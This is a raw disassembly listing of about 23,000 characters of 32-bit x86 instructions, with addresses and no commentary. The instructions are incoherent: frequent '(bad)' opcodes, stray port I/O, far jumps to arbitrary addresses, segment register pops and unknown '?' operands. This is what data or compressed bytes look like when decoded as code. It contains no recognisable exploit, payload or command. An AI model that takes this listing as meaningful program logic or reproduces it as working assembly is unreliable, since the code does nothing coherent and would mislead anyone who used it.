  474c3e:	mov    WORD PTR [eax-0x727c575f],gs
  474c44:	pop    ds
  474c45:	mov    esi,0x78f90f07
  474c4a:	pushf  
  474c4b:	jns    0x474c38
  474c4d:	pop    ebp
  474c4e:	xor    DWORD PTR [eax-0x378d6b83],edx
  474c54:	in     eax,0x53
  474c56:	mov    ebp,0x2aa09c98
  474c5b:	int    0x65
  474c5d:	in     al,0xa4
  474c5f:	nop
  474c60:	add    cl,BYTE PTR [eax+ecx*2+0x499230a3]
  474c67:	mov    WORD PTR [ebx],gs
  474c69:	pop    esp
  474c6a:	add    al,0x79
  474c6c:	push   cs
  474c6d:	ror    DWORD PTR cs:[ebx+eiz*1+0x28f47217],0xe7
  474c76:	pop    esp
  474c77:	enter  0xa3d5,0x80
  474c7b:	aad    0x30
  474c7d:	mov    edi,0xae4b8ed7
  474c82:	pop    eax
  474c83:	ja     0x474c78
  474c85:	cld    
  474c86:	or     eax,0xbfeb56dd
  474c8b:	rol    BYTE PTR [ebx-0x157c023e],1
  474c91:	or     BYTE PTR [esi+0xa0e4a1d],cl
  474c97:	jae    0x474cbb
  474c99:	dec    ebx
  474c9a:	loopne 0x474cfc
  474c9c:	push   ebp
  474c9d:	and    edx,0x3b
  474ca0:	ret    0x2a53
  474ca3:	add    ebp,edi
  474ca5:	scas   eax,DWORD PTR es:[edi]
  474ca6:	pusha  
  474ca7:	pop    ecx
  474ca8:	adc    al,0x30
  474caa:	mov    edi,0x4de438d7
  474caf:	jae    0x474ca5
  474cb1:	add    al,dh
  474cb3:	mov    eax,ds:0xe4f06fec
  474cb8:	pop    ss
  474cb9:	xchg   BYTE PTR [esi+ebx*4],bh
  474cbc:	or     al,0x75
  474cbe:	pusha  
  474cbf:	mov    ah,0x74
  474cc1:	adc    al,0x60
  474cc3:	jo     0x474cfd
  474cc5:	push   es
  474cc6:	pop    ebx
  474cc7:	cmp    BYTE PTR [esi+0x43],0xc8
  474ccb:	mov    eax,ds:0x8dc1fa81
  474cd0:	imul   ebp,DWORD PTR [edx+0x30811d84],0xffffff80
  474cd7:	mov    ch,0x6f
  474cd9:	add    DWORD PTR [esi-0x72],ecx
  474cdc:	xor    al,0xbe
  474cde:	ins    BYTE PTR es:[edi],dx
  474cdf:	add    BYTE PTR [ebx+eiz*4+0xf],dh
  474ce3:	into   
  474ce4:	and    BYTE PTR [edi],ch
  474ce6:	fwait
  474ce7:	sub    al,0x0
  474ce9:	jb     0x474c73
  474ceb:	js     0x474c85
  474ced:	xor    al,0x1
  474cef:	scas   al,BYTE PTR es:[edi]
  474cf0:	ror    DWORD PTR [edx+0x70],1
  474cf3:	mov    al,0x88
  474cf5:	rcl    BYTE PTR [eax+ebp*8],0x76
  474cf9:	mov    bl,dh
  474cfb:	mov    esp,0x8b5cc204
  474d00:	(bad)  
  474d01:	repz repnz cld 
  474d04:	pop    esp
  474d05:	dec    edx
  474d06:	inc    ebp
  474d07:	dec    esp
  474d08:	mov    edi,0xcac138f0
  474d0d:	out    dx,eax
  474d0e:	out    dx,eax
  474d0f:	jns    0x474cc9
  474d11:	cwde   
  474d12:	mov    esi,0x89a82440
  474d17:	add    bh,BYTE PTR [eax+0x6fe819b4]
  474d1d:	frstor [edi+0x6f]
  474d20:	or     eax,DWORD PTR [edi-0x6c]
  474d23:	xchg   DWORD PTR [edx],ebx
  474d25:	mov    eax,ds:0x7852c60f
  474d2a:	or     dl,BYTE PTR [ebx]
  474d2c:	js     0x474d3f
  474d2e:	dec    ecx
  474d2f:	cmp    edx,DWORD PTR [eax]
  474d31:	cmp    BYTE PTR ds:0x98441fac,dl
  474d37:	or     al,0x28
  474d39:	mov    esp,0x71198c9
  474d3e:	pusha  
  474d3f:	ins    DWORD PTR es:[edi],dx
  474d40:	(bad)  
  474d41:	loopne 0x474d87
  474d43:	aaa    
  474d44:	rcr    BYTE PTR [ecx],1
  474d46:	fs nop
  474d48:	out    dx,eax
  474d49:	xor    edx,DWORD PTR [ecx]
  474d4b:	pop    esp
  474d4c:	int3   
  474d4d:	lock stos DWORD PTR es:[edi],eax
  474d4f:	sbb    al,0x22
  474d51:	pop    es
  474d52:	and    al,0x72
  474d54:	daa    
  474d55:	pusha  
  474d56:	ins    BYTE PTR es:[edi],dx
  474d57:	jmp    FWORD PTR [esi]
  474d59:	adc    ebx,DWORD PTR [ebp+0x32]
  474d5c:	retf   0x1f94
  474d5f:	sub    eax,0x5571180d
  474d64:	jo     0x474d48
  474d66:	mov    ecx,0x53fb21a3
  474d6b:	(bad)  
  474d6c:	les    esp,FWORD PTR [eax-0x5b]
  474d6f:	mov    ds:0x752c11c8,eax
  474d74:	addr16 mov al,0xe
  474d77:	int3   
  474d78:	pusha  
  474d79:	sbb    eax,0x1075012f
  474d7e:	scas   al,BYTE PTR es:[edi]
  474d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  474d80:	sar    BYTE PTR [ebp-0x5c0b0db0],cl
  474d86:	shl    BYTE PTR [eax],1
  474d88:	dec    edx
  474d89:	push   ds
  474d8a:	add    DWORD PTR [edi-0x17],esi
  474d8d:	jle    0x474da4
  474d8f:	mov    eax,0x145008d4
  474d94:	mov    ecx,0xd9c0f780
  474d99:	out    dx,ax
  474d9b:	int3   
  474d9c:	mov    edi,0x99053bde
  474da1:	inc    edx
  474da2:	mov    al,0xfb
  474da4:	ins    BYTE PTR es:[edi],dx
  474da5:	jl     0x474dba
  474da7:	pcmpeqw mm1,QWORD PTR [eax]
  474daa:	cmp    edx,DWORD PTR ds:0x90037ea7
  474db0:	push   0x5c4a71f9
  474db5:	ds fucomip st,st(0)
  474db8:	xor    ecx,eax
  474dba:	push   ds
  474dbb:	(bad)  
  474dbc:	cld    
  474dbd:	fnstsw WORD PTR [esi-0x3c]
  474dc0:	(bad)  
  474dc1:	adc    al,0x30
  474dc3:	popa   
  474dc4:	or     BYTE PTR [eax+ecx*2],al
  474dc7:	mov    edi,DWORD PTR [edx+0x18]
  474dca:	inc    ebx
  474dcb:	mov    eax,0x8b758d12
  474dd0:	cmc    
  474dd1:	ss jle 0x474da1
  474dd4:	pop    ss
  474dd5:	xor    DWORD PTR fs:[eax-0x18b78cc1],ecx
  474ddc:	pop    eax
  474ddd:	or     ch,al
  474ddf:	and    dl,BYTE PTR [ecx+0x61e97361]
  474de5:	pusha  
  474de6:	mov    esi,0x4f49690e
  474deb:	or     BYTE PTR [edi],dl
  474ded:	add    BYTE PTR [eax-0xd],0xdd
  474df1:	jge    0x474dc5
  474df3:	push   edx
  474df4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  474df5:	push   0x334e5a90
  474dfa:	nop
  474dfb:	or     BYTE PTR ds:0x2abc8261,al
  474e01:	mov    ah,BYTE PTR [ecx]
  474e03:	xchg   esp,eax
  474e04:	pop    ebp
  474e05:	daa    
  474e06:	lods   eax,DWORD PTR ds:[esi]
  474e07:	push   0x4a1cd345
  474e0c:	pusha  
  474e0d:	(bad)  
  474e0e:	fstp   TBYTE PTR [ecx]
  474e10:	test   esp,eax
  474e12:	mov    ebx,0x7894b248
  474e17:	jge    0x474e75
  474e19:	push   es
  474e1a:	mov    DWORD PTR [edi-0x2f675ea0],ebx
  474e20:	mov    dh,0x66
  474e22:	cmp    BYTE PTR [esp+ebx*8],0x40
  474e26:	xchg   ebp,eax
  474e27:	push   eax
  474e28:	cli    
  474e29:	pusha  
  474e2a:	push   cs
  474e2b:	adc    al,0xd1
  474e2d:	dec    edx
  474e2e:	cli    
  474e2f:	pop    ss
  474e30:	dec    ebp
  474e31:	dec    esp
  474e32:	or     al,0xeb
  474e34:	dec    eax
  474e35:	mov    esi,edi
  474e37:	dec    esi
  474e38:	jmp    0x474e3b
  474e3a:	dec    esi
  474e3b:	push   es
  474e3c:	push   esi
  474e3d:	mov    di,0x1240
  474e41:	mov    cl,BYTE PTR [eax+esi*1]
  474e44:	and    ecx,0xe9720d3f
  474e4a:	mov    edi,0xec9d6030
  474e4f:	into   
  474e50:	and    al,0xd0
  474e52:	jns    0x474e59
  474e54:	dec    ecx
  474e55:	sub    esp,0xffffffdf
  474e58:	dec    ecx
  474e59:	loopne 0x474e24
  474e5b:	inc    BYTE PTR [ecx+0x1e]
  474e5e:	add    al,0xb2
  474e60:	add    ch,bl
  474e62:	adc    ecx,DWORD PTR [edx+0x3c933804]
  474e68:	pop    ecx
  474e69:	fcomp  DWORD PTR [edx+eax*1]
  474e6c:	mov    eax,edx
  474e6e:	out    0x73,eax
  474e70:	add    BYTE PTR [ebx],ch
  474e72:	or     ch,al
  474e74:	repz je 0x474e16
  474e77:	inc    esi
  474e78:	or     BYTE PTR [edi+ecx*1-0x1f4b3f7b],cl
  474e7f:	or     eax,0x6e90ac7b
  474e84:	xor    ecx,ecx
  474e86:	cmp    eax,DWORD PTR [edi]
  474e88:	daa    
  474e89:	mov    esi,DWORD PTR [ebp-0x4a]
  474e8c:	push   cs
  474e8d:	add    al,cl
  474e8f:	ja     0x474e6a
  474e91:	arpl   dx,ax
  474e93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  474e94:	in     eax,dx
  474e95:	lock jle 0x474ea1
  474e98:	adc    eax,0xc2910d34
  474e9d:	add    cl,ah
  474e9f:	mov    ch,0x6c
  474ea1:	aaa    
  474ea2:	push   ebp
  474ea3:	cmp    BYTE PTR [ecx-0x5b1256f6],al
  474ea9:	inc    esi
  474eaa:	xor    eax,0x4498ac34
  474eaf:	fsubp  st(7),st
  474eb1:	mov    cl,0x30
  474eb3:	inc    ebx
  474eb4:	xchg   esi,ebx
  474eb6:	mov    WORD PTR [ecx+0x40],?
  474eb9:	cmp    edi,ebx
  474ebb:	jl     0x474ee2
  474ebd:	dec    edi
  474ebe:	or     eax,0x27610ad1
  474ec3:	mov    edx,ds
  474ec5:	dec    edx
  474ec6:	inc    ebp
  474ec7:	dec    eax
  474ec8:	jge    0x474e82
  474eca:	and    al,0x20
  474ecd:	pushf  
  474ece:	fbstp  TBYTE PTR [edx]
  474ed0:	add    esp,DWORD PTR [ecx-0x2c610e6]
  474ed6:	and    eax,0x1190bd2f
  474edb:	and    DWORD PTR [ecx],0xa649f046
  474ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  474ee2:	test   al,0x1f
  474ee4:	(bad)  
  474ee5:	cmp    ebx,DWORD PTR [ebp-0xc]
  474ee8:	jge    0x474e97
  474eea:	fstp   TBYTE PTR [esp+0x75d57c7e]
  474ef1:	and    ebx,DWORD PTR ds:0x602c671e
  474ef7:	xchg   DWORD PTR [esp+ecx*1],ebx
  474efa:	dec    eax
  474efb:	push   0xf81aac18
  474f00:	sub    al,0x4
  474f02:	mov    DWORD PTR [eax],ebx
  474f04:	out    0x5c,eax
  474f06:	and    eax,0x1ba74704
  474f0b:	dec    edx
  474f0c:	jbe    0x474f21
  474f0e:	inc    edi
  474f0f:	and    BYTE PTR [ebx+0x3f],ah
  474f12:	pusha  
  474f13:	jle    0x474f4c
  474f15:	xchg   BYTE PTR [ebp+esi*2+0x542ee508],ch
  474f1c:	jge    0x474f78
  474f1e:	cmp    esp,DWORD PTR [ebp+0x4bc8fb2f]
  474f24:	cmp    ebx,esp
  474f26:	jg     0x474f34
  474f28:	js     0x474f91
  474f2a:	xchg   BYTE PTR [esi+0x8d77f85],cl
  474f30:	dec    DWORD PTR [eax]
  474f32:	add    esi,DWORD PTR [edi+eax*2]
  474f35:	cmp    al,0x91
  474f37:	(bad)  [ebx+0x18b495c7]
  474f3d:	jb     0x474f85
  474f3f:	push   es
  474f40:	pop    es
  474f41:	mov    ah,0x6d
  474f43:	xor    ch,BYTE PTR [edi+ecx*8+0x26]
  474f47:	int    0xbf
  474f49:	pushf  
  474f4a:	push   ss
  474f4b:	(bad)  
  474f4d:	jge    0x474f5e
  474f4f:	pop    ss
  474f50:	mov    DWORD PTR [edi-0x6dacf587],edi
  474f56:	add    ebp,esp
  474f58:	outs   dx,DWORD PTR ds:[esi]
  474f59:	fiadd  DWORD PTR [eax+0x592ac32b]
  474f5f:	push   edx
  474f60:	inc    ebx
  474f61:	fld    st(5)
  474f63:	out    0xd8,eax
  474f65:	das    
  474f66:	xlat   BYTE PTR ds:[ebx]
  474f67:	(bad)  
  474f69:	popa   
  474f6a:	xor    ah,bh
  474f6c:	inc    edi
  474f6d:	ja     0x474f91
  474f6f:	mov    dl,BYTE PTR [ebx+eax*8-0x4f]
  474f73:	int3   
  474f74:	lock xor edi,edi
  474f77:	and    edx,0x3bb1581
  474f7d:	push   esi
  474f7e:	add    edx,DWORD PTR [esi]
  474f80:	(bad)  
  474f81:	(bad)  
  474f82:	dec    eax
  474f83:	int    0x9f
  474f85:	ret    
  474f86:	pushf  
  474f87:	push   es
  474f88:	or     al,0x99
  474f8a:	dec    edx
  474f8b:	jae    0x474fb1
  474f8d:	xor    dh,dl
  474f8f:	test   DWORD PTR [esi+ebx*1],esi
  474f92:	adc    DWORD PTR [ebx-0x14913c3a],ecx
  474f98:	push   es
  474f99:	sub    al,0xe
  474f9b:	pop    ss
  474f9c:	jl     0x474f86
  474f9e:	xor    esi,esi
  474fa0:	loopne 0x474f53
  474fa2:	lods   eax,DWORD PTR ds:[esi]
  474fa3:	push   es
  474fa4:	in     eax,dx
  474fa5:	(bad)  
  474fa6:	adc    eax,0x35c0c8bf
  474fab:	cmc    
  474fac:	dec    ebp
  474fad:	push   es
  474fae:	mov    esi,DWORD PTR [esp]
  474fb1:	lods   eax,DWORD PTR ds:[esi]
  474fb2:	retf   0xc3c4
  474fb5:	sub    esi,edi
  474fb7:	pop    eax
  474fb8:	pop    edx
  474fb9:	xchg   edi,eax
  474fba:	or     ah,cl
  474fbc:	jo     0x475003
  474fbe:	call   0x1234e3ab
  474fc3:	jo     0x474fce
  474fc5:	cld    
  474fc6:	rol    DWORD PTR [eax-0x146efb83],0x7c
  474fcd:	out    0x55,eax
  474fcf:	call   0xc780:0x203f8922
  474fd6:	jns    0x474fa9
  474fd8:	test   DWORD PTR [esi-0x27542eb8],ebx
  474fde:	sbb    DWORD PTR [edx-0x79],eax
  474fe1:	(bad)  
  474fe3:	sub    edi,DWORD PTR [edx-0x4c]
  474fe6:	pop    DWORD PTR [edi+edi*1-0x64]
  474fea:	mov    eax,DWORD PTR [edx+eiz*4-0x71d34a05]
  474ff1:	sti    
  474ff2:	add    dh,BYTE PTR [eax+esi*1+0x51]
  474ff6:	pop    es
  474ff7:	mov    ah,0x19
  474ff9:	int3   
  474ffa:	push   esi
  474ffb:	push   ds
  474ffc:	dec    ebx
  474ffd:	sub    eax,0xf8768d2c
  475002:	xor    BYTE PTR [edx],dh
  475004:	mov    edi,0x9b04dfba
  475009:	fld    QWORD PTR [eax+ecx*4]
  47500c:	or     BYTE PTR [ebx+0x2b200f5b],cl
  475012:	lds    ebp,FWORD PTR [eax]
  475014:	jge    0x475021
  475016:	adc    esi,DWORD PTR [edi]
  475018:	sar    BYTE PTR [ebx],1
  47501a:	bnd jbe 0x474fc4
  47501d:	(bad)  
  47501e:	push   ebp
  47501f:	fsubr  DWORD PTR [ebp+0x67]
  475023:	(bad)  
  475025:	jo     0x475034
  475027:	mov    eax,0x74064a2d
  47502c:	ret    
  47502d:	loopne 0x47501b
  47502f:	mov    ?,WORD PTR [ecx+0x1d4e3d0c]
  475035:	inc    esp
  475036:	retf   0x13c
  475039:	sbb    eax,0x38165c1d
  47503e:	adc    dl,0x43
  475041:	callw  0x24df
  475045:	xchg   ebx,eax
  475046:	mov    ah,0xc1
  475048:	xchg   esi,eax
  475049:	psubsw mm7,mm5
  47504c:	sub    eax,DWORD PTR [ebx]
  47504e:	outs   dx,DWORD PTR ds:[esi]
  47504f:	sti    
  475050:	jp     0x474fe6
  475052:	push   ecx
  475053:	daa    
  475054:	mov    edx,DWORD PTR [edi]
  475056:	sub    edx,esi
  475058:	mov    eax,0x3921481a
  47505d:	sub    BYTE PTR [eax],bl
  47505f:	je     0x475063
  475061:	dec    esi
  475062:	repnz lods al,BYTE PTR ds:[esi]
  475064:	adc    eax,eax
  475066:	pop    es
  475067:	add    cl,BYTE PTR [edi+eax*1+0x75]
  47506b:	fst    DWORD PTR [edx]
  47506d:	dec    eax
  47506e:	xchg   ebp,eax
  47506f:	rcr    BYTE PTR [edx],1
  475071:	pop    edx
  475072:	pop    es
  475073:	inc    ebx
  475074:	cs stc 
  475076:	pop    esp
  475077:	push   ss
  475078:	hlt    
  475079:	mov    esp,0x24af9c9
  47507e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47507f:	rcl    BYTE PTR [ebp+0x18],0x4a
  475083:	and    dl,BYTE PTR [edi]
  475085:	add    ebx,eax
  475087:	nop
  475088:	mov    eax,0xa87ddf4
  47508d:	lahf   
  47508e:	push   ebp
  47508f:	rcr    BYTE PTR [eax-0x43],1
  475092:	fcom   DWORD PTR [ecx-0x5ec7363d]
  475098:	xchg   ebp,eax
  475099:	cmp    al,0xf4
  47509b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47509c:	adc    ebx,DWORD PTR [esi+0x21]
  47509f:	loope  0x47511e
  4750a1:	xor    ah,ch
  4750a3:	push   edi
  4750a4:	mov    eax,ds:0x48f1940
  4750a9:	(bad)  
  4750aa:	idiv   DWORD PTR [ecx+0x28c89b54]
  4750b0:	data16 aaa 
  4750b2:	push   es
  4750b3:	cs push edi
  4750b5:	std    
  4750b6:	dec    DWORD PTR [edx+0x2a07375c]
  4750bc:	fdiv   DWORD PTR [edx+0x1a]
  4750bf:	inc    ebx
  4750c0:	mov    BYTE PTR [ebp-0x1],al
  4750c3:	mov    al,BYTE PTR [ebp-0x57]
  4750c6:	stos   DWORD PTR es:[edi],eax
  4750c7:	(bad)  
  4750c8:	not    DWORD PTR ds:0xfe1cde06
  4750ce:	retf   
  4750cf:	jne    0x4750bb
  4750d1:	test   BYTE PTR [ebx+0xa7d0cfe],al
  4750d7:	pop    ebx
  4750d8:	pop    ecx
  4750d9:	pop    es
  4750da:	aam    0x66
  4750dc:	or     al,BYTE PTR [ebp+esi*2-0x38]
  4750e0:	mov    ebx,0xfebf3614
  4750e5:	daa    
  4750e6:	clc    
  4750e7:	pop    ds
  4750e8:	ja     0x4750f1
  4750ea:	or     BYTE PTR [eax],cl
  4750ec:	arpl   WORD PTR [edi],cx
  4750ee:	xchg   edx,eax
  4750ef:	pop    ebx
  4750f0:	fst    DWORD PTR [ecx-0x3a]
  4750f3:	pop    es
  4750f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4750f5:	fs inc bh
  4750f8:	add    eax,0xda54a9ed
  4750fd:	mov    ds:0x4412b409,al
  475102:	add    BYTE PTR [eax+0x5d],cl
  475105:	retf   0xe75a
  475108:	add    DWORD PTR ds:0xa38da31c,eax
  47510e:	adc    bh,0x4b
  475111:	data16 adc bl,BYTE PTR [ebx]
  475114:	enter  0xba66,0x3
  475118:	mov    ebp,0x462b7059
  47511d:	mov    DWORD PTR ds:0xe8c15861,edx
  475123:	or     ah,BYTE PTR [ebx-0x225f27af]
  475129:	arpl   WORD PTR [esi-0x40473464],di
  47512f:	xor    DWORD PTR [ecx+0x27fb3808],edi
  475135:	cmp    BYTE PTR [edi-0x3b],cl
  475138:	add    cl,BYTE PTR [edi]
  47513a:	test   DWORD PTR [ebp+0x2828ba97],ebp
  475140:	int    0xe9
  475142:	test   esi,edx
  475144:	adc    eax,esi
  475146:	add    eax,0x4c0c534d
  47514b:	mov    edx,0x283f06ee
  475150:	mov    ebx,0xc8ef5591
  475155:	pop    ecx
  475156:	mov    eax,0xb18bba77
  47515b:	pop    ds
  47515c:	out    dx,al
  47515d:	aas    
  47515e:	add    dh,BYTE PTR [eax]
  475160:	and    DWORD PTR [edi+ecx*1-0x6b],ebp
  475164:	ret    
  475165:	mov    BYTE PTR ds:0x450c224d,bl
  47516b:	ins    DWORD PTR es:[edi],dx
  47516c:	hlt    
  47516d:	ins    DWORD PTR es:[edi],dx
  47516e:	outs   dx,DWORD PTR ds:[esi]
  47516f:	popa   
  475170:	mov    eax,0x9958da1
  475175:	test   DWORD PTR [esi],0x288607f
  47517b:	inc    eax
  47517c:	inc    edx
  47517d:	cmp    eax,0x8df5755b
  475182:	test   DWORD PTR [ecx],esp
  475184:	sbb    al,0x7d
  475186:	mov    ds:0x661076b9,al
  47518b:	mov    eax,0xf17bed68
  475190:	lock dec ebp
  475192:	push   ds
  475193:	add    bh,BYTE PTR [ebx-0x3f88b781]
  475199:	mov    ebp,0x66436ee0
  47519e:	cmp    DWORD PTR [edx],0x3a
  4751a1:	xchg   esp,eax
  4751a2:	ror    DWORD PTR [eax+0x255fb20d],0xe1
  4751a9:	xchg   ecx,eax
  4751aa:	scas   al,BYTE PTR es:[edi]
  4751ab:	cmp    cl,BYTE PTR ss:[eax+0x75]
  4751af:	jmp    0x3fbd809f
  4751b4:	add    eax,0x6c4a6ac2
  4751b9:	pop    edx
  4751ba:	xchg   ebp,eax
  4751bb:	shl    BYTE PTR [edx-0x4fd595c7],0x60
  4751c2:	or     al,dh
  4751c4:	and    DWORD PTR ds:0xa2c36f07,esp
  4751ca:	ins    DWORD PTR es:[edi],dx
  4751cb:	cmp    BYTE PTR [ebx+0x1],0xee
  4751cf:	add    bh,dh
  4751d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4751d2:	xchg   DWORD PTR [ecx],esi
  4751d4:	lock dec ecx
  4751d6:	jne    0x4751d1
  4751d8:	push   ebx
  4751d9:	mov    ebx,0x12bc93be
  4751de:	xchg   esi,ecx
  4751e0:	mov    edx,0x30a40840
  4751e5:	xchg   ebp,eax
  4751e6:	in     eax,0xb8
  4751e8:	fmul   DWORD PTR [ecx+0x15]
  4751eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4751ec:	or     BYTE PTR [edi],al
  4751ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4751ef:	jmp    0x4751ce
  4751f1:	sar    BYTE PTR [edi-0x4536cc3a],cl
  4751f7:	adc    al,0x15
  4751f9:	mov    ds:0x2a829080,eax
  4751fe:	jo     0x4751ca
  475200:	xchg   esp,eax
  475201:	xchg   bh,al
  475203:	mov    al,0xb5
  475205:	scas   eax,DWORD PTR es:[edi]
  475206:	adc    edi,DWORD PTR [ebp-0x64]
  475209:	cwde   
  47520a:	mov    edx,0xda28431b
  47520f:	sbb    BYTE PTR [edx-0x3b5d40fd],bl
  475215:	inc    esi
  475216:	call   0x4e87b634
  47521b:	sbb    al,0xe8
  47521d:	test   DWORD PTR [edx-0x4e027045],edx
  475223:	sub    al,0xba
  475225:	(bad)  
  475227:	int3   
  475228:	mov    ds:0xba2e2586,al
  47522d:	push   cs
  47522e:	sbb    DWORD PTR [eax-0x6c78106d],edx
  475234:	in     al,0x19
  475236:	in     al,0x97
  475238:	dec    ebx
  475239:	out    dx,al
  47523a:	push   es
  47523b:	mov    BYTE PTR [ebp+0x2f],ch
  47523e:	mov    edx,0xa4dc891d
  475243:	add    DWORD PTR [ecx-0x23e057cc],ebp
  475249:	dec    ebp
  47524a:	jb     0x47523f
  47524c:	inc    eax
  47524d:	xor    BYTE PTR [edx-0x471f475a],ah
  475253:	mov    esp,ss
  475255:	ror    BYTE PTR [eax+ecx*2],cl
  475258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  475259:	pop    eax
  47525a:	mov    eax,0x72d8d420
  47525f:	in     eax,dx
  475260:	cmp    DWORD PTR [eax+ebx*8-0x48],0xffffff90
  475265:	mov    cl,0x3a
  475267:	mov    edx,0x1e94d91e
  47526c:	sbb    BYTE PTR [edx],ch
  47526e:	in     eax,dx
  47526f:	sar    BYTE PTR [esi-0x30],1
  475272:	sub    BYTE PTR [edi-0x30],ah
  475275:	mov    eax,0xb4a90198
  47527a:	dec    ecx
  47527b:	int3   
  47527c:	inc    edx
  47527d:	fsubr  QWORD PTR [ecx]
  47527f:	test   al,0xe
  475281:	xchg   ecx,eax
  475282:	in     al,0xcc
  475284:	mov    eax,0xc85f19c
  475289:	enter  0x4149,0xee
  47528d:	enter  0xc825,0x76
  475291:	xor    ah,bl
  475293:	call   0x2d27:0xcee86bce
  47529a:	ins    BYTE PTR es:[edi],dx
  47529b:	inc    eax
  47529c:	hlt    
  47529d:	sbb    eax,0xa423c47c
  4752a2:	dec    ebp
  4752a3:	xor    ah,BYTE PTR [eax]
  4752a5:	les    edi,FWORD PTR [edi]
  4752a7:	ret    0xf9c0
  4752aa:	sbb    DWORD PTR [edx+esi*8+0x5],0xbaf4c010
  4752b2:	add    bh,cl
  4752b4:	dec    edx
  4752b5:	jecxz  0x475267
  4752b7:	das    
  4752b8:	clc    
  4752b9:	mov    edx,0x75ff1d10
  4752be:	pop    esi
  4752bf:	ror    BYTE PTR [ecx-0x28],0xee
  4752c3:	cld    
  4752c4:	push   0xf40e1e20
  4752c9:	mov    eax,0xedc9c8da
  4752ce:	adc    eax,0x3924376d
  4752d3:	sub    al,0xa4
  4752d5:	lea    ebp,[esi]
  4752d7:	mov    ecx,0x4e0cf018
  4752dc:	add    al,BYTE PTR [ebp-0x5ab5e304]
  4752e2:	mov    cs,esi
  4752e4:	sar    BYTE PTR [edx-0x56f5e6f0],0xa3
  4752eb:	in     eax,dx
  4752ec:	jg     0x4752f4
  4752ee:	scas   eax,DWORD PTR es:[edi]
  4752ef:	pop    ebx
  4752f0:	add    DWORD PTR [ebp+ebp*2-0x38d09bd1],edi
  4752f7:	scas   eax,DWORD PTR es:[edi]
  4752f8:	ins    DWORD PTR es:[edi],dx
  4752f9:	add    BYTE PTR [eax],ah
  4752fb:	mov    dh,0xb9
  4752fd:	push   cs
  4752fe:	loopne 0x475364
  475300:	sub    al,0x20
  475302:	pop    ds
  475303:	add    ah,BYTE PTR [ecx+0x6d]
  475306:	pop    ss
  475307:	cmc    
  475308:	pop    edx
  475309:	aaa    
  47530a:	cdq    
  47530b:	jo     0x4752a4
  47530d:	push   0xf6686847
  475312:	inc    ecx
  475313:	sbb    al,0x25
  475315:	out    0x20,eax
  475317:	cmp    DWORD PTR [edi],ebx
  475319:	ss dec ebp
  47531b:	inc    edx
  47531c:	aaa    
  47531d:	sbb    eax,0xcc3adf20
  475322:	or     BYTE PTR [edi+ecx*4+0x7c],bh
  475326:	pop    ss
  475327:	push   es
  475328:	cmp    dh,BYTE PTR [ebx+0x73]
  47532b:	ss and eax,0x24cc85ac
  475331:	sub    al,0x2f
  475333:	iret   
  475334:	xchg   edi,eax
  475335:	jl     0x47533d
  475337:	mov    es,WORD PTR [esi]
  475339:	in     al,dx
  47533a:	or     cl,ah
  47533c:	iret   
  47533d:	or     BYTE PTR [eax],ch
  47533f:	nop
  475340:	rcr    BYTE PTR [ecx],1
  475342:	xlat   BYTE PTR ds:[ebx]
  475343:	aaa    
  475344:	nop
  475345:	(bad)  
  475346:	popf   
  475347:	cdq    
  475348:	sub    ah,BYTE PTR [eax+eax*8+0x7e]
  47534c:	in     al,dx
  47534d:	mov    DWORD PTR [edi+ebx*8],esi
  475350:	sbb    BYTE PTR [eax+0x2a],ch
  475353:	pusha  
  475354:	es cld 
  475356:	(bad)  [edx+0x1]
  475359:	mov    ecx,DWORD PTR ds:0xec8a955c
  47535f:	test   eax,0x7c7c6b72
  475364:	pushf  
  475365:	adc    al,0xf5
  475367:	int    0x81
  475369:	ins    BYTE PTR es:[edi],dx
  47536a:	sub    bh,BYTE PTR [eax]
  47536c:	jae    0x475376
  47536e:	mov    DWORD PTR [edx+0xc],ebx
  475371:	mov    eax,edx
  475373:	jns    0x475383
  475375:	pop    es
  475376:	or     al,0xd5
  475378:	pop    ds
  475379:	ror    edi,cl
  47537b:	in     al,dx
  47537c:	or     al,0xa8
  47537e:	sidtd  [ecx+0x42fa4353]
  475385:	mov    al,0xad
  475387:	jecxz  0x475348
  475389:	cmp    al,dh
  47538b:	inc    edi
  47538c:	hlt    
  47538d:	mov    bl,0x70
  47538f:	prefetcht2 BYTE PTR ds:0xd5b6368
  475396:	mov    ebx,DWORD PTR [esi]
  475398:	imul   ecx,DWORD PTR [eax],0xffffffe6
  47539b:	adc    BYTE PTR [esi],0x46
  47539e:	and    eax,0x843384f1
  4753a3:	ror    BYTE PTR [esi],cl
  4753a5:	jmp    0xbbd7:0x3421b982
  4753ac:	dec    edi
  4753ad:	pusha  
  4753ae:	inc    ecx
  4753af:	clc    
  4753b0:	lods   al,BYTE PTR ds:[esi]
  4753b1:	inc    ecx
  4753b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4753b3:	add    edi,DWORD PTR [ecx+ecx*2]
  4753b6:	add    ebx,edi
  4753b8:	xor    BYTE PTR ds:0xab06191e,0x38
  4753bf:	in     eax,0x81
  4753c1:	sar    edx,cl
  4753c3:	or     DWORD PTR [edi+0x68],ebx
  4753c6:	js     0x4753aa
  4753c8:	(bad)  
  4753ca:	mov    ebp,0x2428a582
  4753cf:	mov    BYTE PTR [esi],bl
  4753d1:	push   ebx
  4753d2:	and    DWORD PTR [eax],edi
  4753d4:	mov    ds:0xba8b6130,eax
  4753d9:	mov    ecx,0x5c0b2c83
  4753de:	or     bh,BYTE PTR [eax+0x84e0384]
  4753e4:	lahf   
  4753e5:	mov    al,ds:0x322f5b25
  4753ea:	inc    BYTE PTR [esi]
  4753ec:	add    ecx,DWORD PTR [ebx+ebp*2+0x46]
  4753f0:	jb     0x475457
  4753f2:	gs push ebx
  4753f4:	jo     0x4753f3
  4753f6:	pop    edi
  4753f7:	les    eax,FWORD PTR [ebp+0x58]
  4753fa:	inc    ebp
  4753fb:	js     0x47543e
  4753fd:	in     eax,0x92
  4753ff:	lock xadd DWORD PTR [edx],eax
  475403:	inc    eax
